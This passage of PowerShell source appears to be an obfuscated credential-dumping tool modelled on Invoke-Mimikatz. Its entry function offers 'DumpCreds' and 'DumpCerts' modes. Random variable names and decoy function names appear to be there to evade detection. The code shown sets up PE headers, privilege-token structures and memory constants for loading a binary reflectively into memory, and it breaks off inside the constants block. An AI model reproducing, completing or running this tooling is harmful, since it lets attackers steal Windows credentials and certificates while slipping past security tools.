function riced
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$vLxUJFib99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DxNLUWTh99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $HZuAcUWu99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$PzyUFrdV99 = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PIziCNzK99,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$IHEQTmsb99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$WFiuVmll99,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$YWoghwEI99,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$kaJiFGhK99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ucmYvWRU99
	)
	
	Function Platonism
	{
		$LJGBrAPz99 = New-Object System.Object
		$oJRHPqWW99 = [AppDomain]::CurrentDomain
		$WUdLOyHe99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$NtQekUya99 = $oJRHPqWW99.DefineDynamicAssembly($WUdLOyHe99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$nPkixAJP99 = $NtQekUya99.DefineDynamicModule('DynamicModule', $false)
		$AzUEPUym99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$seOzsThy99 = $nPkixAJP99.DefineEnum('MachineType', 'Public', [UInt16])
		$seOzsThy99.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$seOzsThy99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$seOzsThy99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$seOzsThy99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$VqUozrRZ99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $VqUozrRZ99
		$seOzsThy99 = $nPkixAJP99.DefineEnum('MagicType', 'Public', [UInt16])
		$seOzsThy99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$givGYYbE99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $givGYYbE99
		$seOzsThy99 = $nPkixAJP99.DefineEnum('SubSystemType', 'Public', [UInt16])
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$PMHITpGv99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $PMHITpGv99
		$seOzsThy99 = $nPkixAJP99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$seOzsThy99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$seOzsThy99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$seOzsThy99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$seOzsThy99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$seOzsThy99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$seOzsThy99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$UZiyxXGv99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $UZiyxXGv99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_DATA_DIRECTORY', $shmcWcei99, [System.ValueType], 8)
		($seOzsThy99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($seOzsThy99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$oLAhvXNH99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $oLAhvXNH99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_FILE_HEADER', $shmcWcei99, [System.ValueType], 20)
		$seOzsThy99.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$ERyXTcyU99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $ERyXTcyU99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_OPTIONAL_HEADER64', $shmcWcei99, [System.ValueType], 240)
		($seOzsThy99.DefineField('Magic', $givGYYbE99, 'Public')).SetOffset(0) | Out-Null
		($seOzsThy99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($seOzsThy99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($seOzsThy99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($seOzsThy99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($seOzsThy99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($seOzsThy99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($seOzsThy99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($seOzsThy99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($seOzsThy99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($seOzsThy99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($seOzsThy99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($seOzsThy99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($seOzsThy99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($seOzsThy99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($seOzsThy99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($seOzsThy99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($seOzsThy99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($seOzsThy99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($seOzsThy99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($seOzsThy99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($seOzsThy99.DefineField('Subsystem', $PMHITpGv99, 'Public')).SetOffset(68) | Out-Null
		($seOzsThy99.DefineField('DllCharacteristics', $UZiyxXGv99, 'Public')).SetOffset(70) | Out-Null
		($seOzsThy99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($seOzsThy99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($seOzsThy99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($seOzsThy99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($seOzsThy99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($seOzsThy99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($seOzsThy99.DefineField('ExportTable', $oLAhvXNH99, 'Public')).SetOffset(112) | Out-Null
		($seOzsThy99.DefineField('ImportTable', $oLAhvXNH99, 'Public')).SetOffset(120) | Out-Null
		($seOzsThy99.DefineField('ResourceTable', $oLAhvXNH99, 'Public')).SetOffset(128) | Out-Null
		($seOzsThy99.DefineField('ExceptionTable', $oLAhvXNH99, 'Public')).SetOffset(136) | Out-Null
		($seOzsThy99.DefineField('CertificateTable', $oLAhvXNH99, 'Public')).SetOffset(144) | Out-Null
		($seOzsThy99.DefineField('BaseRelocationTable', $oLAhvXNH99, 'Public')).SetOffset(152) | Out-Null
		($seOzsThy99.DefineField('Debug', $oLAhvXNH99, 'Public')).SetOffset(160) | Out-Null
		($seOzsThy99.DefineField('Architecture', $oLAhvXNH99, 'Public')).SetOffset(168) | Out-Null
		($seOzsThy99.DefineField('GlobalPtr', $oLAhvXNH99, 'Public')).SetOffset(176) | Out-Null
		($seOzsThy99.DefineField('TLSTable', $oLAhvXNH99, 'Public')).SetOffset(184) | Out-Null
		($seOzsThy99.DefineField('LoadConfigTable', $oLAhvXNH99, 'Public')).SetOffset(192) | Out-Null
		($seOzsThy99.DefineField('BoundImport', $oLAhvXNH99, 'Public')).SetOffset(200) | Out-Null
		($seOzsThy99.DefineField('IAT', $oLAhvXNH99, 'Public')).SetOffset(208) | Out-Null
		($seOzsThy99.DefineField('DelayImportDescriptor', $oLAhvXNH99, 'Public')).SetOffset(216) | Out-Null
		($seOzsThy99.DefineField('CLRRuntimeHeader', $oLAhvXNH99, 'Public')).SetOffset(224) | Out-Null
		($seOzsThy99.DefineField('Reserved', $oLAhvXNH99, 'Public')).SetOffset(232) | Out-Null
		$gFJMePgF99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $gFJMePgF99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_OPTIONAL_HEADER32', $shmcWcei99, [System.ValueType], 224)
		($seOzsThy99.DefineField('Magic', $givGYYbE99, 'Public')).SetOffset(0) | Out-Null
		($seOzsThy99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($seOzsThy99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($seOzsThy99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($seOzsThy99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($seOzsThy99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($seOzsThy99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($seOzsThy99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($seOzsThy99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($seOzsThy99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($seOzsThy99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($seOzsThy99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($seOzsThy99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($seOzsThy99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($seOzsThy99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($seOzsThy99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($seOzsThy99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($seOzsThy99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($seOzsThy99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($seOzsThy99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($seOzsThy99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($seOzsThy99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($seOzsThy99.DefineField('Subsystem', $PMHITpGv99, 'Public')).SetOffset(68) | Out-Null
		($seOzsThy99.DefineField('DllCharacteristics', $UZiyxXGv99, 'Public')).SetOffset(70) | Out-Null
		($seOzsThy99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($seOzsThy99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($seOzsThy99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($seOzsThy99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($seOzsThy99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($seOzsThy99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($seOzsThy99.DefineField('ExportTable', $oLAhvXNH99, 'Public')).SetOffset(96) | Out-Null
		($seOzsThy99.DefineField('ImportTable', $oLAhvXNH99, 'Public')).SetOffset(104) | Out-Null
		($seOzsThy99.DefineField('ResourceTable', $oLAhvXNH99, 'Public')).SetOffset(112) | Out-Null
		($seOzsThy99.DefineField('ExceptionTable', $oLAhvXNH99, 'Public')).SetOffset(120) | Out-Null
		($seOzsThy99.DefineField('CertificateTable', $oLAhvXNH99, 'Public')).SetOffset(128) | Out-Null
		($seOzsThy99.DefineField('BaseRelocationTable', $oLAhvXNH99, 'Public')).SetOffset(136) | Out-Null
		($seOzsThy99.DefineField('Debug', $oLAhvXNH99, 'Public')).SetOffset(144) | Out-Null
		($seOzsThy99.DefineField('Architecture', $oLAhvXNH99, 'Public')).SetOffset(152) | Out-Null
		($seOzsThy99.DefineField('GlobalPtr', $oLAhvXNH99, 'Public')).SetOffset(160) | Out-Null
		($seOzsThy99.DefineField('TLSTable', $oLAhvXNH99, 'Public')).SetOffset(168) | Out-Null
		($seOzsThy99.DefineField('LoadConfigTable', $oLAhvXNH99, 'Public')).SetOffset(176) | Out-Null
		($seOzsThy99.DefineField('BoundImport', $oLAhvXNH99, 'Public')).SetOffset(184) | Out-Null
		($seOzsThy99.DefineField('IAT', $oLAhvXNH99, 'Public')).SetOffset(192) | Out-Null
		($seOzsThy99.DefineField('DelayImportDescriptor', $oLAhvXNH99, 'Public')).SetOffset(200) | Out-Null
		($seOzsThy99.DefineField('CLRRuntimeHeader', $oLAhvXNH99, 'Public')).SetOffset(208) | Out-Null
		($seOzsThy99.DefineField('Reserved', $oLAhvXNH99, 'Public')).SetOffset(216) | Out-Null
		$YWKrUbHG99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $YWKrUbHG99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_NT_HEADERS64', $shmcWcei99, [System.ValueType], 264)
		$seOzsThy99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('FileHeader', $ERyXTcyU99, 'Public') | Out-Null
		$seOzsThy99.DefineField('OptionalHeader', $gFJMePgF99, 'Public') | Out-Null
		$JnjpluMD99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $JnjpluMD99
		
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_NT_HEADERS32', $shmcWcei99, [System.ValueType], 248)
		$seOzsThy99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('FileHeader', $ERyXTcyU99, 'Public') | Out-Null
		$seOzsThy99.DefineField('OptionalHeader', $YWKrUbHG99, 'Public') | Out-Null
		$VmsEbqnU99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $VmsEbqnU99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_DOS_HEADER', $shmcWcei99, [System.ValueType], 64)
		$seOzsThy99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$iSSdMHvt99 = $seOzsThy99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$qQJDmPEZ99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$faUVoZUy99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$WSRoQIwJ99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($AzUEPUym99, $qQJDmPEZ99, $faUVoZUy99, @([Int32] 4))
		$iSSdMHvt99.SetCustomAttribute($WSRoQIwJ99)
		$seOzsThy99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$UUpZmAkW99 = $seOzsThy99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$qQJDmPEZ99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$WSRoQIwJ99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($AzUEPUym99, $qQJDmPEZ99, $faUVoZUy99, @([Int32] 10))
		$UUpZmAkW99.SetCustomAttribute($WSRoQIwJ99)
		$seOzsThy99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$PIuqEfyS99 = $seOzsThy99.CreateType()	
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $PIuqEfyS99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_SECTION_HEADER', $shmcWcei99, [System.ValueType], 40)
		$fWGGEmOL99 = $seOzsThy99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$qQJDmPEZ99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$WSRoQIwJ99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($AzUEPUym99, $qQJDmPEZ99, $faUVoZUy99, @([Int32] 8))
		$fWGGEmOL99.SetCustomAttribute($WSRoQIwJ99)
		$seOzsThy99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$mSoTSKEC99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $mSoTSKEC99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_BASE_RELOCATION', $shmcWcei99, [System.ValueType], 8)
		$seOzsThy99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$KVPEixBf99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $KVPEixBf99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $shmcWcei99, [System.ValueType], 20)
		$seOzsThy99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$fgjvzXRC99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $fgjvzXRC99
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('IMAGE_EXPORT_DIRECTORY', $shmcWcei99, [System.ValueType], 40)
		$seOzsThy99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$seOzsThy99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('Base', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$HurtDwKb99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $HurtDwKb99
		
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('LUID', $shmcWcei99, [System.ValueType], 8)
		$seOzsThy99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('LUID_AND_ATTRIBUTES', $shmcWcei99, [System.ValueType], 12)
		$seOzsThy99.DefineField('Luid', $LUID, 'Public') | Out-Null
		$seOzsThy99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$upDneAZq99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $upDneAZq99
		
		$shmcWcei99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$seOzsThy99 = $nPkixAJP99.DefineType('TOKEN_PRIVILEGES', $shmcWcei99, [System.ValueType], 16)
		$seOzsThy99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$seOzsThy99.DefineField('Privileges', $upDneAZq99, 'Public') | Out-Null
		$McKEsVQO99 = $seOzsThy99.CreateType()
		$LJGBrAPz99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $McKEsVQO99
		return $LJGBrAPz99
	}
	Function recommenced
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
